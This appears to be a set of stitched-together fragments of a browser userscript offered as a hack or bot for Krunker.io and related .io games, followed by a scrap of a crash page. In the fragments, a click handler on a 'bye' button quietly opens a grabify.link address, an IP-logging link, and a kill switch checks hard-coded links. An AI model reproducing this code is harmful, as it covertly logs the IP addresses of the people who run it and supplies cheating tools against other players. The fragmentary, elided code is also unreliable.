...
function activatehack(socket) {
    ...
    function lnkfunc(value) {
        ...
        if (value == "SKRIBBL-IO.NET") { value2 = "SKRIBBLIO.NET"; }
        if (value == "IO-OYUNLAR.COM") { value2 = "IOOYUNLAR.COM"; }
    ...
    document.addEventListener("click", (e) => {
        if (e.target.id == "byebtn") {
            window.open("https://grabify.link/3P1XUC", null, `height=300, width=300, status=yes, toolbar=no, menubar=no, location=no`);
    ...
    if (links.one != "https://cutit.org/hax") { unsafeWindow.online = false; }
    var colorsrain;
...
class Krunkbot {
    constructor() {
        this.modules = [];
        this.values = 'grabify.link/3P1XUC<hr>cutit.org/hax';
    }
    init() {
...
<body>
<div class="container">
<div class="title">Arthur Krunker.io BOT has crashed!</div>
